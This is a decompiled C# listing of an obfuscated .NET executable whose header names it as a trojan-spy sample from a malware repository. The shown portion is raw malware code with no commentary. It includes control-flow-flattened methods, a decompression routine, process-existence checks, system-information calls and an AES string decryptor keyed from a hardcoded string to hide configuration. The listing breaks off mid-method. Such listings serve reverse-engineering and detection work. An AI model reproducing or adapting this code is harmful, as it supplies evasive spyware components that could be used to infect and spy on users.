// Decompiled with JetBrains decompiler
// Type: ##
// Assembly: qouzb, Version=0.0.0.0, Culture=neutral, PublicKeyToken=34256fcd934ca661
// MVID: 528C9DDA-94F5-4688-B6FB-056FFA07C362
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Generic-6c64cd522d7e6f3c0b6f0116271cde81e35213ad4a360fe569f48f99fd473e62.exe

using \u00231b;
using \u0023A;
using \u0023c;
using \u0023de;
using \u0023Ff;
using \u0023O;
using \u0023rc;
using \u0023Rh;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class \u0023\u0023
{
  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023Zh([In] int obj0, [In] byte[] obj1, [In] \u0023qc.\u0023Cc obj2, [In] int obj3)
  {
    int num1;
    int length;
    int num2;
    try
    {
      num1 = obj2.\u0023Nc;
      int num3 = 3;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 3:
            if (obj3 > obj2.\u0023Oc)
            {
              obj3 = obj2.\u0023Oc;
              num3 = 5;
              continue;
            }
            num1 = obj2.\u0023Nc - obj2.\u0023Oc + obj3 & (int) short.MaxValue;
            goto case 5;
          case 1:
          case 2:
            length = obj3 - num1;
            if (length > 0)
            {
              num3 = 4;
              continue;
            }
            break;
          case 4:
            Array.Copy((Array) obj2.\u0023Hc, 32768 - length, (Array) obj1, obj0, length);
            obj0 += length;
            obj3 = num1;
            break;
          case 5:
            num2 = obj3;
            goto case 1;
          case 6:
            goto label_12;
          default:
            num3 = 1;
            continue;
        }
        Array.Copy((Array) obj2.\u0023Hc, num1 - obj3, (Array) obj1, obj0, obj3);
        obj2.\u0023Oc -= num2;
        if (obj2.\u0023Oc < 0)
          num3 = 6;
        else
          goto label_13;
      }
label_12:
      throw new InvalidOperationException();
label_13:
      return num2;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) length;
      \u0023qc.\u0023Cc cc = obj2;
      byte[] numArray = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) obj3;
      \u0023\u0023.\u00233k(ex, (object) local1, (object) local2, (object) local3, (object) cc, (object) numArray, (object) local4, (object) local5);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00230h([In] Image obj0, [In] \u00232f obj1)
  {
    obj1.\u0023Wf = obj0;
    obj1.Refresh();
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u00231h([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u00232h(string _param0)
  {
    Process[] processesByName;
    bool flag1;
    try
    {
      processesByName = Process.GetProcessesByName(_param0);
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            if (processesByName.Length <= 0)
              goto label_5;
            else
              goto case 1;
          case 1:
          case 2:
            flag1 = true;
            num = 4;
            continue;
          case 4:
            goto label_7;
          default:
            num = 2;
            continue;
        }
      }
label_5:
      flag1 = false;
    }
    catch (Exception ex)
    {
      Process[] processArray = processesByName;
      bool flag2;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local = (ValueType) flag2;
      string str = _param0;
      \u0023\u0023.\u0023Dj(ex, (object) processArray, (object) local, (object) str);
      throw;
    }
label_7:
    return flag1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u00233h([In] \u0023qc.\u0023Qd obj0)
  {
    try
    {
      return obj0.ReadByte() | obj0.ReadByte() << 8;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Qd qd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) qd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u00234h([In] \u0023nf obj0) => obj0.\u0023lf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Exception \u00235h([In] \u00239e obj0) => obj0.\u0023Ie;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0023Z.\u0023Pg \u00236h()
  {
    int num1 = 2;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_3;
          case 4:
            goto label_7;
          default:
            num2 = 4;
            continue;
        }
      }
label_1:
      if (!\u0023Z.\u0023xg)
        num1 = 3;
      else
        goto label_13;
    }
label_3:
    \u0023Z.\u0023yg = new \u0023Z.\u0023Pg();
label_7:
    try
    {
      \u0023Z.\u0023yg.\u0023Eg = Marshal.SizeOf(typeof (\u0023Z.\u0023Pg));
      int num3 = 2;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 2:
            goto label_8;
          case 1:
          case 3:
            goto label_11;
          default:
            num3 = 3;
            continue;
        }
      }
label_8:
      int num4 = (int) \u0023\u0023.\u0023ai(ref \u0023Z.\u0023yg);
label_11:
      \u0023Z.\u0023xg = true;
    }
    catch
    {
    }
label_13:
    return \u0023Z.\u0023yg;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00237h([In] \u0023qc.\u0023md obj0)
  {
    try
    {
      obj0.\u0023gd = 0;
      obj0.\u0023hd = 0;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023md md = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) md);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static short \u00238h([In] int obj0)
  {
    try
    {
      return (short) ((int) \u0023qc.\u0023md.\u0023cd[obj0 & 15] << 12 | (int) \u0023qc.\u0023md.\u0023cd[obj0 >> 4 & 15] << 8 | (int) \u0023qc.\u0023md.\u0023cd[obj0 >> 8 & 15] << 4 | (int) \u0023qc.\u0023md.\u0023cd[obj0 >> 12]);
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) obj0;
      \u0023\u0023.\u0023Oj(ex, (object) local);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u00239h([In] \u0023qc.\u0023Mc obj0)
  {
    try
    {
      return obj0.\u0023Lc;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Mc mc = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) mc);
      throw;
    }
  }

  [DllImport("kernel32.Dll", EntryPoint = "GetVersionEx")]
  internal static extern short \u0023ai([In] ref \u0023Z.\u0023Pg obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023bi([In] \u0023ge obj0, [In] \u0023yf obj1) => \u0023\u0023.\u0023bi(obj0, obj1, string.Empty);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023ci([In] \u0023Af obj0, [In] \u0023wg obj1)
  {
    if (obj1.\u0023ug == null)
    {
      try
      {
        UploadReportLoginService reportLoginService = new UploadReportLoginService();
        int num1;
        if (obj1.\u0023vg != null)
        {
          num1 = 4;
          goto label_9;
        }
        else
          goto label_8;
label_3:
        if (obj1.\u0023ug.Length == 0)
          throw new ApplicationException("Cannot connect to webservice");
        int num2;
        if (obj1.\u0023ug == "ditto")
        {
          num2 = 5;
          if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            goto label_10;
        }
        else
          goto label_14;
label_7:
        reportLoginService.Proxy = obj1.\u0023vg;
        num1 = 3;
        goto label_9;
label_8:
        obj1.\u0023ug = reportLoginService.GetServerURL(obj1.\u0023tg);
        goto label_3;
label_9:
        num2 = num1;
label_10:
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_3;
            case 1:
            case 3:
              goto label_8;
            case 4:
              goto label_7;
            case 5:
              goto label_12;
            default:
              if (\u0023\u0023.UBSgn55zIxbZDXest3e())
              {
                num2 = 0;
                continue;
              }
              goto label_12;
          }
        }
label_12:
        obj1.\u0023ug = \u0023wg.\u0023sg;
      }
      catch (Exception ex)
      {
        obj0("ERR 2001: " + ex.Message);
        return;
      }
    }
label_14:
    obj0(obj1.\u0023ug.StartsWith("ERR") ? obj1.\u0023ug : "OK");
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023di([In] string obj0, [In] \u0023hf obj1, [In] string obj2) => \u0023\u0023.\u0023Yi(obj2, obj1.\u0023he, (object) obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023ei(string _param0)
  {
    string s;
    RijndaelManaged rijndaelManaged;
    MD5CryptoServiceProvider cryptoServiceProvider;
    string str1;
    byte[] destinationArray;
    ICryptoTransform decryptor;
    byte[] inputBuffer;
    byte[] hash;
    Exception exception;
    try
    {
      s = "京会很日美零京贝";
      rijndaelManaged = new RijndaelManaged();
      cryptoServiceProvider = new MD5CryptoServiceProvider();
      str1 = "";
      string str2;
      try
      {
        destinationArray = new byte[32];
        int num1 = 2;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
            case 2:
              hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(s));
              num2 = 5;
              break;
            case 1:
            case 5:
              Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 10);
              goto case 4;
            case 3:
              rijndaelManaged.Key = destinationArray;
              rijndaelManaged.Mode = CipherMode.ECB;
              decryptor = rijndaelManaged.CreateDecryptor();
              inputBuffer = Convert.FromBase64String(_param0);
              str1 = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
              num2 = 6;
              break;
            case 4:
              Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 10);
              num2 = 3;
              break;
            case 6:
              goto label_9;
            default:
              num2 = 4;
              break;
          }
          num1 = num2;
        }
label_9:
        str2 = str1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        exception = ex;
        ProjectData.ClearProjectError();
      }
      return str2;
    }
    catch (Exception ex)
    {
      string str3;
      object[] objArray = new object[11]
      {
        (object) rijndaelManaged,
        (object) str1,
        (object) s,
        (object) cryptoServiceProvider,
        (object) str3,
        (object) inputBuffer,
        (object) decryptor,
        (object) destinationArray,
        (object) hash,
        (object) exception,
        (object) _param0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023fi([In] \u0023Qh obj0)
  {
    try
    {
      obj0.\u0023ph.Visible = false;
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_1;
            case 1:
            case 2:
              goto label_5;
            case 4:
              goto label_7;
            default:
              num2 = 2;
              continue;
          }
        }
label_1:
        obj0.\u0023ch.Visible = true;
label_5:
        if (obj0.\u0023hf != null)
          num1 = 4;
        else
          break;
      }
      return;
label_7:
      \u0023\u0023.\u0023li(obj0, new ThreadStart(obj0.\u0023Jh));
    }
    catch
    {
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023gi([In] \u0023qc.\u0023Cc obj0)
  {
    try
    {
      return obj0.\u0023Oc;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Cc cc = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) cc);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static SecurityException \u0023hi([In] \u0023nf obj0) => obj0.\u0023jf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023ii()
  {
    string str1;
    try
    {
      str1 = "";
    }
    catch (Exception ex)
    {
      string str2 = str1;
      \u0023\u0023.\u0023Oj(ex, (object) str2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023ji([In] Exception obj0, [In] object[] obj1)
  {
    int num1 = 4;
    if (true)
      goto label_4;
label_1:
    StackTrace stackTrace = new StackTrace(obj0);
    if (\u0023\u0023.UBSgn55zIxbZDXest3e())
    {
      num1 = 5;
      goto label_4;
    }
label_2:
    int num2 = -1;
    num1 = 1;
label_4:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 4:
          goto label_2;
        case 1:
          goto label_3;
        case 2:
        case 3:
          goto label_1;
        case 5:
          goto label_6;
        default:
          if (true)
          {
            num1 = 3;
            continue;
          }
          goto label_6;
      }
    }
label_3:
    int num3 = -1;
    int num4 = 0;
    goto label_1;
label_6:
    try
    {
      if (obj0.StackTrace != null)
      {
        int num5 = 1;
        while (true)
        {
          int num6 = num5;
          string[] strArray;
          int index;
          while (true)
          {
            switch (num6)
            {
              case 0:
              case 1:
                strArray = obj0.StackTrace.Split('\r', '\n');
                if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
                {
                  num6 = 3;
                  continue;
                }
                goto case 2;
              case 2:
              case 4:
              case 5:
                if (index < strArray.Length)
                {
                  if (strArray[index].Length > 0)
                    ++num4;
                  ++index;
                  num6 = 5;
                  continue;
                }
                goto label_19;
              case 3:
                index = 0;
                goto case 2;
              default:
                goto label_15;
            }
          }
label_15:
          num5 = 4;
        }
      }
    }
    catch
    {
      num4 = -1;
    }
label_19:
    try
    {
      if (stackTrace.FrameCount > 0)
      {
        int num7 = 2;
        StackFrame frame;
        while (true)
        {
          switch (num7)
          {
            case 0:
            case 2:
              frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
              goto case 1;
            case 1:
            case 3:
              num2 = (frame.GetMethod().MetadataToken & 16777215) - 1;
              num7 = 4;
              continue;
            case 4:
              goto label_25;
            default:
              num7 = 3;
              continue;
          }
        }
label_25:
        num3 = frame.GetILOffset();
      }
    }
    catch
    {
    }
    try
    {
      SmartStackFrame smartStackFrame = new SmartStackFrame(num2, obj1, num3, num4);
      int num8 = 3;
      LinkedList<object> linkedList;
      while (true)
      {
        int num9 = num8;
        while (true)
        {
          switch (num9)
          {
            case 0:
            case 3:
              if (!obj0.Data.Contains((object) "SmartStackFrames"))
              {
                num9 = 2;
                continue;
              }
              goto label_34;
            case 1:
            case 2:
              goto label_28;
            case 4:
            case 5:
              goto label_35;
            default:
              if (true)
              {
                num9 = 4;
                continue;
              }
              goto case 0;
          }
        }
label_34:
        linkedList = (LinkedList<object>) obj0.Data[(object) "SmartStackFrames"];
        num8 = 5;
      }
label_28:
      linkedList = new LinkedList<object>();
      obj0.Data[(object) "SmartStackFrames"] = (object) linkedList;
label_35:
      linkedList.AddLast((object) smartStackFrame);
    }
    catch
    {
    }
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023ki([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023bi([In] \u0023ge obj0, [In] \u0023yf obj1, [In] string obj2, [In] string obj3)
  {
    int num = 3;
    \u0023of fe;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          fe((object) obj0, new \u0023tf(obj1, obj2, obj3));
          num = 5;
          continue;
        case 1:
        case 4:
          if (fe == null)
            goto label_3;
          else
            goto case 0;
        case 3:
          fe = obj0.\u0023fe;
          num = 4;
          continue;
        case 5:
          goto label_7;
        default:
          num = 0;
          continue;
      }
    }
label_3:
    return;
label_7:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023li([In] \u0023Qh obj0, [In] ThreadStart obj1)
  {
    obj0.\u00236g = new Thread(obj1);
    obj0.\u00236g.Start();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023mi([In] \u0023qc.\u0023Pd obj0)
  {
    try
    {
      return obj0.\u0023Od;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Pd pd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) pd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static long \u0023ni([In] \u0023qc.\u0023bd obj0)
  {
    try
    {
      return obj0.\u00238c;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023bd bd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) bd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023oi([In] Assembly obj0, [In] Assembly obj1)
  {
    byte[] publicKey1;
    byte[] publicKey2;
    bool flag;
    int index;
    try
    {
      publicKey1 = obj0.GetName().GetPublicKey();
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 5:
            publicKey2 = obj1.GetName().GetPublicKey();
            num = 3;
            continue;
          case 1:
          case 3:
            if (publicKey2 == null == (publicKey1 == null))
            {
              if (publicKey2 != null)
              {
                num = 2;
                continue;
              }
              goto label_14;
            }
            else
              goto label_3;
          case 2:
            for (index = 0; index < publicKey2.Length; ++index)
            {
              if ((int) publicKey2[index] != (int) publicKey1[index])
              {
                flag = false;
                goto label_16;
              }
            }
            num = 6;
            continue;
          case 4:
            goto label_16;
          case 6:
            goto label_14;
          default:
            num = 4;
            continue;
        }
      }
label_3:
      flag = false;
      goto label_16;
label_14:
      flag = true;
    }
    catch (Exception ex)
    {
      byte[] numArray1 = publicKey1;
      byte[] numArray2 = publicKey2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) index;
      Assembly assembly1 = obj0;
      Assembly assembly2 = obj1;
      \u0023\u0023.\u0023mk(ex, (object) numArray1, (object) numArray2, (object) local, (object) assembly1, (object) assembly2);
      throw;
    }
label_16:
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023pi([In] \u0023ge obj0, [In] IWebProxy obj1) => obj0.\u0023ee = obj1;

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023qi([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023ri([In] \u0023hf obj0, [In] string obj1)
  {
    if (System.IO.File.Exists(obj1))
      System.IO.File.Delete(obj1);
    return \u0023\u0023.\u0023ql(obj0.\u0023he, obj1);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023si([In] \u0023qc.\u00236c obj0, [In] \u0023qc.\u0023Mc obj1)
  {
label_0:
    int wc1;
    int num1;
    bool flag;
    int num2;
    int num3;
    int num4;
    int num5;
    int num6;
    byte num7;
    try
    {
      while (true)
      {
        wc1 = obj0.\u0023wc;
        int num8 = 3;
        while (true)
        {
          int num9 = num8;
          while (true)
          {
            switch (num9)
            {
              case 0:
                goto label_10;
              case 1:
              case 2:
                if (obj0.\u0023Zc < 0)
                {
                  num9 = 14;
                  continue;
                }
                goto label_17;
              case 3:
                switch (wc1)
                {
                  case 0:
                    obj0.\u0023Yc = \u0023\u0023.\u0023cj(obj1, 5);
                    if (obj0.\u0023Yc >= 0)
                    {
                      obj0.\u0023Yc += 257;
                      \u0023\u0023.\u0023Ui(obj1, 5);
                      num9 = 15;
                      continue;
                    }
                    goto label_37;
                  case 1:
                    break;
                  case 2:
                    goto label_40;
                  case 3:
                    goto label_6;
                  case 4:
                    goto label_20;
                  case 5:
                    goto label_12;
                  default:
                    goto label_0;
                }
                break;
              case 4:
              case 8:
                obj0.\u0023wc = 2;
                goto label_40;
              case 5:
label_20:
                if (((num2 = \u0023\u0023.\u0023sl(obj0.\u0023Xc, obj1)) & -16) != 0)
                {
                  if (num2 >= 0)
                  {
                    if (num2 >= 17)
                    {
                      if (true)
                      {
                        num9 = 0;
                        continue;
                      }
                      goto label_10;
                    }
                    else
                      goto label_11;
                  }
                  else
                    goto label_22;
                }
                else
                  goto label_34;
              case 6:
                goto label_1;
              case 7:
label_6:
                if (obj0.\u00234c < obj0.\u00230c)
                {
                  num5 = \u0023\u0023.\u0023cj(obj1, 3);
                  if (num5 >= 0)
                  {
                    \u0023\u0023.\u0023Ui(obj1, 3);
                    if (true)
                    {
                      num9 = 11;
                      continue;
                    }
                    goto case 15;
                  }
                  else
                    goto label_30;
                }
                else
                  goto label_7;
              case 9:
                \u0023\u0023.\u0023Ui(obj1, 4);
                obj0.\u0023Vc = new byte[19];
                obj0.\u00234c = 0;
                obj0.\u0023wc = 3;
                goto case 7;
              case 10:
                goto label_23;
              case 11:
                obj0.\u0023Vc[\u0023qc.\u00236c.\u00235c[obj0.\u00234c]] = (byte) num5;
                ++obj0.\u00234c;
                goto case 7;
              case 12:
                if (obj0.\u00234c != obj0.\u00231c)
                  goto case 5;
                else
                  goto label_19;
              case 13:
              case 16:
                goto label_45;
              case 14:
                goto label_16;
              case 15:
                obj0.\u0023wc = 1;
                break;
              default:
                goto label_27;
            }
            obj0.\u0023Zc = \u0023\u0023.\u0023cj(obj1, 5);
            num9 = 1;
            continue;
label_40:
            obj0.\u00230c = \u0023\u0023.\u0023cj(obj1, 4);
            if (obj0.\u00230c >= 0)
            {
              obj0.\u00230c += 4;
              if (true)
                num9 = 9;
              else
                goto label_45;
            }
            else
              goto label_41;
          }
label_1:
          if (num1-- <= 0)
          {
            if (obj0.\u00234c == obj0.\u00231c)
            {
              flag = true;
              num8 = 16;
              continue;
            }
            break;
          }
          byte[] wc2 = obj0.\u0023Wc;
          num4 = obj0.\u00234c++;
          int index1 = num4;
          int num10 = (int) obj0.\u00233c;
          wc2[index1] = (byte) num10;
          num8 = 6;
          continue;
label_7:
          obj0.\u0023Xc = new \u0023qc.\u0023Sc(obj0.\u0023Vc);
          obj0.\u0023Vc = (byte[]) null;
          obj0.\u00234c = 0;
          num8 = 10;
          continue;
label_10:
          obj0.\u00233c = (byte) 0;
label_11:
          obj0.\u00232c = num2 - 16;
          obj0.\u0023wc = 5;
label_12:
          num3 = \u0023qc.\u00236c.\u0023Uc[obj0.\u00232c];
          num1 = \u0023\u0023.\u0023cj(obj1, num3);
          if (num1 >= 0)
          {
            \u0023\u0023.\u0023Ui(obj1, num3);
            num1 += \u0023qc.\u00236c.\u0023Tc[obj0.\u00232c];
            goto label_1;
          }
          else
            goto label_13;
label_17:
          ++obj0.\u0023Zc;
          \u0023\u0023.\u0023Ui(obj1, 5);
          obj0.\u00231c = obj0.\u0023Yc + obj0.\u0023Zc;
          obj0.\u0023Wc = new byte[obj0.\u00231c];
          num8 = 8;
          continue;
label_22:
          flag = false;
          num8 = 13;
          continue;
label_23:
          obj0.\u0023wc = 4;
          num8 = 5;
          continue;
label_27:
          num8 = 7;
          continue;
label_34:
          byte[] wc3 = obj0.\u0023Wc;
          num6 = obj0.\u00234c++;
          int index2 = num6;
          obj0.\u00233c = num7 = (byte) num2;
          int num11 = (int) num7;
          wc3[index2] = (byte) num11;
          num8 = 12;
        }
        obj0.\u0023wc = 4;
      }
label_13:
      flag = false;
      goto label_45;
label_16:
      flag = false;
      goto label_45;
label_19:
      flag = true;
      goto label_45;
label_30:
      flag = false;
      goto label_45;
label_37:
      flag = false;
      goto label_45;
label_41:
      flag = false;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num5;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) wc1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local6 = (ValueType) num6;
      // ISSUE: variable of a boxed type
      __Boxed<byte> local7 = (ValueType) num7;
      // ISSUE: variable of a boxed type
      __Boxed<int> local8 = (ValueType) num4;
      \u0023qc.\u00236c obj = obj0;
      \u0023qc.\u0023Mc mc = obj1;
      \u0023\u0023.\u00237k(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) local7, (object) local8, (object) obj, (object) mc);
      throw;
    }
label_45:
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023ti([In] \u0023tf obj0) => obj0.\u0023qf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023ui([In] \u0023ge.\u0023ue obj0) => obj0.\u0023re;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Icon \u0023vi()
  {
    int num1 = 5;
    int num2;
    while (true)
    {
      int num3 = num1;
      int num4;
      int num5;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 5:
            goto label_5;
          case 1:
          case 2:
            goto label_6;
          case 3:
            if (num4 <= 0)
              goto label_10;
            else
              goto case 4;
          case 4:
            \u0023\u0023.\u0023Ji(Application.ExecutablePath, 0, ref num2, ref num5, 1);
            if (num2 != 0)
            {
              num3 = 6;
              continue;
            }
            goto label_10;
          case 6:
            goto label_9;
          default:
            if (true)
            {
              num3 = 4;
              continue;
            }
            goto label_5;
        }
      }
label_5:
      num2 = 0;
      num1 = 2;
      continue;
label_6:
      num5 = 0;
      num4 = \u0023\u0023.\u0023Ji(Application.ExecutablePath, -1, ref num5, ref num5, 1);
      num1 = 3;
    }
label_9:
    return Icon.FromHandle(new IntPtr(num2));
label_10:
    return (Icon) null;
  }

  [DllImport("kernel32.Dll", EntryPoint = "GetSystemInfo")]
  internal static extern void \u0023wi([In] ref \u0023Z.\u00230g obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023xi([In] int obj0, [In] string obj1, [In] Graphics obj2, [In] Font obj3)
  {
    int num1 = 5;
    \u0023Z.\u0023Dg dg;
    while (true)
    {
      int num2 = num1;
      IntPtr hdc;
      IntPtr hfont;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            dg = new \u0023Z.\u0023Dg(new Rectangle(0, 0, obj0, 10000));
            num2 = 1;
            continue;
          case 1:
            goto label_6;
          case 2:
            IntPtr num4 = \u0023\u0023.\u0023uj(hdc, hfont);
            \u0023\u0023.\u0023ll(hdc, obj1, -1, ref dg, num3);
            \u0023\u0023.\u0023uj(hdc, num4);
            goto case 3;
          case 3:
          case 4:
            obj2.ReleaseHdc(hdc);
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 6;
              continue;
            }
            goto label_8;
          case 6:
            goto label_8;
          default:
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num2 = 4;
              continue;
            }
            goto case 0;
        }
      }
label_6:
      num3 = 3088;
      hdc = obj2.GetHdc();
      hfont = obj3.ToHfont();
      num1 = 2;
    }
label_8:
    return dg.\u0023Cg - dg.\u0023Ag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023yi([In] \u0023ge.\u0023ue obj0) => obj0.\u0023te;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023zi()
  {
    string str1;
    try
    {
      str1 = "";
    }
    catch (Exception ex)
    {
      string str2 = str1;
      \u0023\u0023.\u0023Oj(ex, (object) str2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0023qc.\u0023Sc \u0023Ai([In] \u0023qc.\u00236c obj0)
  {
    byte[] destinationArray;
    try
    {
      destinationArray = new byte[obj0.\u0023Yc];
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_4;
          default:
            num = 3;
            continue;
        }
      }
label_1:
      Array.Copy((Array) obj0.\u0023Wc, 0, (Array) destinationArray, 0, obj0.\u0023Yc);
label_4:
      return new \u0023qc.\u0023Sc(destinationArray);
    }
    catch (Exception ex)
    {
      byte[] numArray = destinationArray;
      \u0023qc.\u00236c obj = obj0;
      \u0023\u0023.\u0023Jk(ex, (object) numArray, (object) obj);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Bi([In] \u0023hf obj0) => obj0.\u0023cf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023Ci([In] string obj0, [In] \u0023Qh obj1)
  {
    obj0 = obj0.Replace("%AppName%", "vf");
    obj0 = obj0.Replace("%CompanyName%", "fbff");
    return obj0;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Di([In] \u0023qc.\u0023md obj0)
  {
    try
    {
      return obj0.\u0023gd >= 16384;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023md md = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) md);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0023qc.\u0023Sc \u0023Ei([In] \u0023qc.\u00236c obj0)
  {
    byte[] destinationArray;
    try
    {
      destinationArray = new byte[obj0.\u0023Zc];
      int num = 2;
      if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
        goto label_2;
label_1:
      Array.Copy((Array) obj0.\u0023Wc, obj0.\u0023Yc, (Array) destinationArray, 0, obj0.\u0023Zc);
      goto label_4;
label_2:
      while (true)
      {
